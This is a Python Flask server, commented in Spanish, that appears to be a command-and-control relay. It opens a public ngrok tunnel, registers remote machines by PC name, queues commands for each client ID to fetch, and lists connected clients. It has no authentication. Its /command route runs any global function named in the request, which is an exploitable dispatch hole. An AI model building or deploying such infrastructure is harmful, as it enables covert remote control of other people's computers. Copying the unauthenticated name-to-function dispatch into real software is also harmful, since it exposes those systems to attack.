from flask import Flask, request, jsonify
import requests
import threading
import subprocess
from datetime import datetime
import time

app = Flask(__name__)

# Variables globales
stored_data = {}
clients_id = 0
clients_list = []
request_count = 0  # Contador global para las solicitudes
data_available = threading.Event()
current_version = 1 # Versión inicial del archivo o servicio

# Lanzar ngrok en un hilo separado (para evitar bloquear el servidor Flask)
def run_ngrok():
    subprocess.Popen(
        'ngrok http --domain=flexible-elk-monthly.ngrok-free.app 5000',
        shell=True
    )

# Ejecutar ngrok al iniciar el servidor
threading.Thread(target=run_ngrok).start()

# Hilo para contar las solicitudes
def request_counter():
    global request_count
    while True:
        time.sleep(60)  # Esperar 60 segundos
        if request_count > 120:
            print(f"Warning: The server may stop when exceeding the requests per minute limit: {request_count}, more than 120 it's not recommended")
        request_count = 0  # Reiniciar el contador

# Iniciar el hilo para contar las solicitudes
threading.Thread(target=request_counter, daemon=True).start()

@app.route('/')
def home():
    global request_count
    request_count += 1
    print(f'Número de solicitudes: {request_count}')
    return "Servidor listo para recibir datos"

@app.route('/submit', methods=['POST'])
def submit():
    global stored_data, request_count
    request_count += 1
    print(f'Número de solicitudes: {request_count}')
    
    data = request.get_json()
    
    if not isinstance(data, dict):
        return jsonify({'error': 'Invalid data format'}), 400
    
    # Almacenar datos en el formato adecuado
    for client_id, content in data.items():
        if isinstance(content, dict) and 'command' in content:
            stored_data[client_id] = {'command': content['command']}
    
    data_available.set()
    
    return jsonify({
        'message': 'Datos recibidos correctamente',
        'received_data': stored_data
    })

@app.route('/fetch_data/<int:identifier>', methods=['GET'])
def fetch_data(identifier):
    global stored_data, request_count
    request_count += 1
    print(f'Número de solicitudes: {request_count}')

    id = str(identifier)

    data = stored_data.get(id)
    if data:
        data_copy = data.copy()
        del stored_data[id]
        return jsonify(data_copy)
    else:
        return jsonify({'error': 'No data found for this ID'}), 404

@app.route('/setup', methods=['GET'])
def setup():
    global clients_id, clients_list, request_count
    request_count += 1
    print(f'Número de solicitudes: {request_count}')
    
    clients_id += 1
    client_id = clients_id
    pc_name = request.args.get('pc_name')
    start_time = int(request.args.get('start_time'))

    # Convertir timestamp a datetime
    start_time_obj = datetime.fromtimestamp(start_time)
    
    # Añadir la información del cliente a la lista
    clients_list.append({
        'client_id': client_id,
        'pc_name': pc_name,
        'start_time': start_time
    })
    
    # Devolver el client_id generado y la versión del servidor
    return jsonify({
        'clients_id': client_id,
    })

@app.route('/command', methods=['POST'])
def execute_command():
    global request_count
    request_count += 1
    print(f'Número de solicitudes: {request_count}')
    
    data = request.get_json()
    
    if not isinstance(data, dict) or 'command_name' not in data:
        return jsonify({'error': 'Invalid data format or missing command_name'}), 400
    
    command_name = data['command_name']
    
    # Verificar si la función asociada al comando existe
    command_function = globals().get(command_name)
    
    if command_function and callable(command_function):
        # Ejecutar la función y devolver el resultado
        result = command_function()
        return jsonify({'message': f'Comando {command_name} ejecutado.', 'result': result})
    else:
        return jsonify({'error': f'Comando {command_name} no encontrado.'}), 404

@app.route('/current_clients', methods=['GET'])
def current_clients():
    global clients_list, request_count
    request_count += 1
    print(f'Número de solicitudes: {request_count}')

    response = jsonify({'clients_list': clients_list})
    response.headers['Content-Type'] = 'application/json'
    return response

@app.route('/version', methods=['GET'])
def get_version():
    global current_version, request_count
    request_count += 1
    print(f'Número de solicitudes: {request_count}')

    return jsonify({'version': int(current_version)})

@app.route('/reset_clients', methods=['POST'])
def reset_clients():
    global clients_list, clients_id
    clients_list = [] 
    clients_id = 0
    return jsonify({"status": "success", "message": "Clientes reiniciados correctamente"})

if __name__ == '__main__':
    app.run(port=5000)